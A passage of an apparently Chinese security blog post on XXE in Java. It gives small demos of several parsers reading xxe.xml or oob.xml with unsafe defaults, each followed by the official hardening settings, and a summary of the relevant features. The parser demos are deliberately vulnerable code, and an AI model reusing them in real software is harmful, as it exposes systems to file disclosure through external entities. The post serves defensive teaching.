+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxParser.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxParser.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error2.png" alt></p>
+<h2 id="SAXBuilder"><a href="#SAXBuilder" class="headerlink" title="SAXBuilder"></a>SAXBuilder</h2><p>SAXBuilder是一个JDOM解析器 能将路径中的XML文件解析为Document对象</p>
+<p>测试demo(同样需要下载<a href="http://www.jdom.org/dist/binary/jdom-2.0.6.zip" target="_blank" rel="noopener">jar包</a>，然后导入项目中)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.jdom2.Document;</span><br><span class="line"><span class="keyword">import</span> org.jdom2.Element;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"xxe.xml"</span>);</span><br><span class="line">        org.jdom2.input.SAXBuilder saxBuilder = <span class="keyword">new</span> org.jdom2.input.SAXBuilder();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Document document = saxBuilder.build(file);</span><br><span class="line">            Element root = document.getRootElement();</span><br><span class="line">            List&lt;Element&gt; childs = root.getChildren();</span><br><span class="line">            <span class="keyword">for</span> (Element child:childs)&#123;</span><br><span class="line">                String name = child.getName();</span><br><span class="line">                String value = child.getValue();</span><br><span class="line">                System.out.println(name + <span class="string">":"</span> + value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看效果</p>
+<p><img src="/2020/02/17/javaxxe/saxb.png" alt></p>
+<p>成功获取了目标文件内容，查看官方防御</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxBuilder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxBuilder.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error3.png" alt></p>
+<h2 id="SAXTransformer"><a href="#SAXTransformer" class="headerlink" title="SAXTransformer"></a>SAXTransformer</h2><p>测试Demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.transform.sax.SAXTransformerFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXTransformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        SAXTransformerFactory factory = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">        StreamSource source = <span class="keyword">new</span> StreamSource(inputStream);</span><br><span class="line">        factory.newTransformerHandler(source);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看效果</p>
+<p><img src="/2020/02/17/javaxxe/saxt.png" alt></p>
+<p>官方补丁</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error4.png" alt></p>
+<h2 id="XMLReader"><a href="#XMLReader" class="headerlink" title="XMLReader"></a>XMLReader</h2><p> <em>XMLReader</em>是XML解析器的SAX2驱动程序必须实现的接口， 此接口允许应用程序在解析器中设置和查询功能和属性，注册事件处理程序以进行文档处理，以及启动文档解析。</p>
+<p>测试demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.xml.sax.XMLReader;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.XMLReaderFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xmlreader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        XMLReader reader = XMLReaderFactory.createXMLReader();</span><br><span class="line">        reader.parse(String.valueOf(file));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看效果</p>
+<p><img src="/2020/02/17/javaxxe/xmlr.png" alt></p>
+<p>防御手段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error5.png" alt></p>
+<h2 id="Schema"><a href="#Schema" class="headerlink" title="Schema"></a>Schema</h2><p>demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.XMLConstants;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Source;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> javax.xml.validation.SchemaFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Schema</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);</span><br><span class="line">        Source source = <span class="keyword">new</span> StreamSource(file);</span><br><span class="line">        schemaFactory.newSchema(source);</span><br></pre></td></tr></table></figure>
+
+<p>运行查看效果</p>
+<p><img src="/2020/02/17/javaxxe/schema.png" alt></p>
+<p>官方给出的修复手段为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<p>和上一个Reader的修复方法一致</p>
+<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.dom.DOMResult;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        TransformerFactory factory = TransformerFactory.newInstance();</span><br><span class="line">        StreamSource source = <span class="keyword">new</span> StreamSource(file);</span><br><span class="line">        factory.newTransformer().transform(source, <span class="keyword">new</span> DOMResult());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看</p>
+<p><img src="/2020/02/17/javaxxe/transformer.png" alt></p>
+<p>修复手段也和上面两个一致</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="ValidatorSample"><a href="#ValidatorSample" class="headerlink" title="ValidatorSample"></a>ValidatorSample</h2><p>Demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.transform.Source;</span><br><span class="line"><span class="keyword">import</span> javax.xml.validation.Schema;</span><br><span class="line"><span class="keyword">import</span> javax.xml.validation.SchemaFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.validation.Validator;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValidatorSample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        SchemaFactory factory = SchemaFactory.newInstance(<span class="string">"http://www.w3.org/2001/XMLSchema"</span>);</span><br><span class="line">        Schema schema = factory.newSchema();</span><br><span class="line">        Validator validator = schema.newValidator();</span><br><span class="line">        validator.validate((Source) file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行查看效果</p>
+<p><img src="/2020/02/17/javaxxe/vali.png" alt></p>
+<p>修复方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/17/javaxxe/error6.png" alt></p>
+<h2 id="Unmarshaller"><a href="#Unmarshaller" class="headerlink" title="Unmarshaller"></a>Unmarshaller</h2><p>测试Demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.xml.bind.JAXBContext;</span><br><span class="line"><span class="keyword">import</span> javax.xml.bind.Unmarshaller;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unmarsh</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"oob.xml"</span>);</span><br><span class="line">        Class tclass = Unmarsh<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        JAXBContext context = JAXBContext.newInstance(tclass);</span><br><span class="line">        Unmarshaller unmarshaller = context.createUnmarshaller();</span><br><span class="line">        Object obj = unmarshaller.unmarshal(file);</span><br><span class="line">        tclass.cast(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行一下</p>
+<p><img src="/2020/02/17/javaxxe/unmarsh.png" alt></p>
+<p>在默认配置下的时候是不存在XXE漏洞的</p>
+<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><p>纵观所有的修复方案大致可分为两种：</p>
+<ul>
+<li>设置feature的方式</li>
+<li>修改<code>XMLConstants</code>库配置文件</li>
+</ul>
+<p>再说下这几个feature</p>
+<ol>
+<li>disallow-doctype-decl</li>
+</ol>
+<p>默认为False，表示是否禁用DTD，如果启用了该配置项只要尝试在XML中定义DOCTYPE，就会报错，完全就修复了XXE，但是可能会出现一些不兼容的问题。</p>
+<ol start="2">
+<li>external-general-entities</li>
+</ol>
+<p>默认为True，表示是否包含外部普通实体，如果关闭该配置项就不会解析外部普通实体，但是能够解析内部普通实体</p>
+<p><img src="/2020/02/17/javaxxe/hello.png" alt></p>
+<p>解析存在外部参数实体的XML时，虽然会发送外部请求但是在解析的时候就报错退出了</p>
+<p><img src="/2020/02/17/javaxxe/xxe.png" alt></p>
+<ol start="3">
+<li>external-parameter-entities</li>
+</ol>
+<p>默认为True，表示是否包含参数实体，如果关闭该配置项就会不支持解析参数实体，但是可以外部普通实体实现攻击</p>
+<p><img src="/2020/02/17/javaxxe/success.png" alt></p>
+<ol start="4">
+<li>load-external-dtd</li>
+</ol>
+<p>默认为True，表示是否加载外部DTD，如果关闭该配置项表示不会加载DTD文件。但是仍然能使用外部普通实体进行攻击</p>
+<p><img src="/2020/02/17/javaxxe/hack.png" alt></p>
+<p>总之，修复的话要么配置第一条，要么同时配置下面三条。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ</a></p>
+<p><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-总结/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/31/Java-XXE-%E6%80%BB%E7%BB%93/</a></p>
+<p><a href="https://www.mi1k7ea.com/2019/02/13/XML注入之DocumentBuilder/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/</a></p>
+<p><a href="https://www.leadroyal.https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.htmlcn/?p=930" target="_blank" rel="noopener">https://www.leadroyal.https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.htmlcn/?p=930</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/02/02/prepare/" title= "Mysql预编译的二三事">
+                    <div class="prevTitle">Mysql预编译的二三事</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto://yujianan1998@gmail.com" target="_blank" rel="noopener" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Yoga7xm" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abstract"><span class="toc-number">1.</span> <span class="toc-text">Abstract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DocumentBuilder"><span class="toc-number">2.</span> <span class="toc-text">DocumentBuilder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAXReader"><span class="toc-number">3.</span> <span class="toc-text">SAXReader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAXParser"><span class="toc-number">4.</span> <span class="toc-text">SAXParser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAXBuilder"><span class="toc-number">5.</span> <span class="toc-text">SAXBuilder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAXTransformer"><span class="toc-number">6.</span> <span class="toc-text">SAXTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLReader"><span class="toc-number">7.</span> <span class="toc-text">XMLReader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Schema"><span class="toc-number">8.</span> <span class="toc-text">Schema</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Transformer"><span class="toc-number">9.</span> <span class="toc-text">Transformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ValidatorSample"><span class="toc-number">10.</span> <span class="toc-text">ValidatorSample</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unmarshaller"><span class="toc-number">11.</span> <span class="toc-text">Unmarshaller</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于防御"><span class="toc-number">12.</span> <span class="toc-text">关于防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">13.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 61
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/17</span><a class="archive-post-title" href= "/2020/02/17/javaxxe/" >XXE in Java</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href= "/2020/02/02/prepare/" >Mysql预编译的二三事</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
